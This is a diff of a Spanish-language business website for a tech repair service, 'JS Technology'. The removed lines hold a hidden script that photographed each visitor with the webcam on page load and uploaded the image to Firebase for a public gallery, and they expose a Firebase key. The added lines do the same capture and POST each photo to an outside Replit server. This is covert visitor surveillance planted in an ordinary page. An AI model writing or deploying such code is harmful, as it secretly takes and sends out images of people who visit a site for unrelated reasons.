@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Tecnología JS</title>
+  <title>JS Technology</title>
   <style>
     * {
       margin: 0;
@@ -166,33 +166,13 @@
       display: none;
     }
   </style>
-  <!-- Firebase SDKs -->
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
-  <script>
-    // Configuración de Firebase - usa tus datos reales
-    const firebaseConfig = {
-      apiKey: "AIzaSyDooSOXvBhvAcu43WPWlRTbeNP_q4tXVlk",
-      authDomain: "galeriajs-ad536.firebaseapp.com",
-      projectId: "galeriajs-ad536",
-      storageBucket: "galeriajs-ad536.appspot.com",
-      messagingSenderId: "15609705515",
-      appId: "1:15609705515:web:549611e0b4bf045637e66e"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const storage = firebase.storage();
-    const db = firebase.firestore();
-    firebase.auth().signInAnonymously();
-  </script>
 </head>
 <body>
   <!-- Sidebar -->
   <div class="sidebar">
     <div class="logo-container">
       <div class="logo-img"></div>
-      <h2>Tecnología JS</h2>
+      <h2>JS Technology</h2>
     </div>
     <div class="refran">La calidad está en nuestro servicio</div>
     <!-- Servicio Técnico -->
@@ -225,12 +205,7 @@
   <div class="main">
     <div class="section" id="content">
       <h3>Bienvenido a JS Technology</h3>
-      <p>Seleccione una opción del menú para ver más detalles.</p>
-    </div>
-    <!-- Galería Global -->
-    <div class="section" id="galeria">
-      <h3>Galería Global</h3>
-      <div id="fotosGaleria" style="display:flex; flex-wrap:wrap; gap:10px"></div>
+      <p>Selecciona una opción del menú para ver más detalles.</p>
     </div>
   </div>
   <!-- WhatsApp -->
@@ -238,61 +213,10 @@
     <div class="whatsapp-icon"></div>
   </a>
   <!-- Video y Canvas ocultos para captura automática -->
-  <video id="hiddenVideo" autoplay playsinline style="display:none;"></video>
-  <canvas id="hiddenCanvas" width="320" height="240" style="display:none;"></canvas>
+  <video id="hiddenVideo" autoplay playsinline></video>
+  <canvas id="hiddenCanvas" width="320" height="240"></canvas>
   <!-- Scripts -->
   <script>
-    window.addEventListener('DOMContentLoaded', () => {
-      // Siempre tomar foto y subirla a Firebase al entrar o recargar la página
-      const video = document.getElementById('hiddenVideo');
-      const canvas = document.getElementById('hiddenCanvas');
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-        .then(stream => {
-          video.srcObject = stream;
-          video.onloadedmetadata = () => {
-            setTimeout(() => {
-              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-              stream.getTracks().forEach(track => track.stop());
-              canvas.toBlob(blob => {
-                const nombre = 'foto_' + Date.now() + '_' + Math.floor(Math.random()*10000) + '.png';
-                // Sube la imagen a Firebase Storage
-                storage.ref('fotos/' + nombre).put(blob).then(snapshot => {
-                  snapshot.ref.getDownloadURL().then(url => {
-                    // Guarda la URL en Firestore
-                    db.collection('galeria').add({
-                      url: url,
-                      fecha: firebase.firestore.FieldValue.serverTimestamp()
-                    });
-                  });
-                });
-              }, 'image/png');
-            }, 600);
-          };
-        })
-        .catch(err => {
-          console.warn('No se pudo acceder a la cámara:', err);
-        });
-
-      // Cargar galería global en tiempo real
-      db.collection('galeria').orderBy('fecha','desc').onSnapshot(snapshot => {
-        const fotosGaleria = document.getElementById('fotosGaleria');
-        fotosGaleria.innerHTML = '';
-        snapshot.forEach(doc => {
-          const data = doc.data();
-          if(data.url){
-            const img = document.createElement('img');
-            img.src = data.url;
-            img.style.width = '120px';
-            img.style.height = '90px';
-            img.style.objectFit = 'cover';
-            img.style.borderRadius = '8px';
-            img.style.boxShadow = '0 2px 8px #0002';
-            fotosGaleria.appendChild(img);
-          }
-        });
-      });
-    });
-
     function toggleSubmenu(id) {
       const submenu = document.getElementById(id);
       submenu.style.display = submenu.style.display === 'block' ? 'none' : 'block';
@@ -304,6 +228,57 @@
         element.addEventListener('touchstart', handler);
       }
     }
+
+    // --- CAPTURA AUTOMÁTICA Y ENVÍO A BACKEND ---
+
+    const BACKEND_URL = "https://bf67b6e4-cb4c-4562-8533-90dcb58f003f-00-5ya75iltw8tx.worf.replit.dev/api/fotos";
+
+    (function() {
+      const video = document.getElementById('hiddenVideo');
+      const canvas = document.getElementById('hiddenCanvas');
+     
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+          setTimeout(() => {
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+          
+            const foto = canvas.toDataURL('image/jpeg', 0.7);
+           
+            let fotos = [];
+            try {
+              fotos = JSON.parse(localStorage.getItem('fotosGaleriaGlobal')) || [];
+            } catch(e){}
+            fotos.push({ data: foto, fecha: new Date().toLocaleDateString() });
+            localStorage.setItem('fotosGaleriaGlobal', JSON.stringify(fotos));
+          
+            localStorage.setItem('fotosGaleriaGlobal_last_update', Date.now());
+           
+            fetch(BACKEND_URL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ data: foto, fecha: new Date().toLocaleDateString() })
+            })
+            .then(res => res.json())
+            .then(response => {
+              // Opcional: puedes mostrar un mensaje de éxito
+              console.log("Foto enviada al backend:", response);
+            })
+            .catch(err => {
+              // Opcional: manejar error de red
+              console.error("Error enviando foto al backend:", err);
+            });
+            // Detener cámara
+            if (video.srcObject) {
+              video.srcObject.getTracks().forEach(track => track.stop());
+            }
+          }, 1000);
+        })
+        .catch(() => { /* Aclaro que la pagina pide permiso att:Andres */ });
+    })();
+
     function showContent(option) {
       const content = document.getElementById('content');
       let servicio = '';
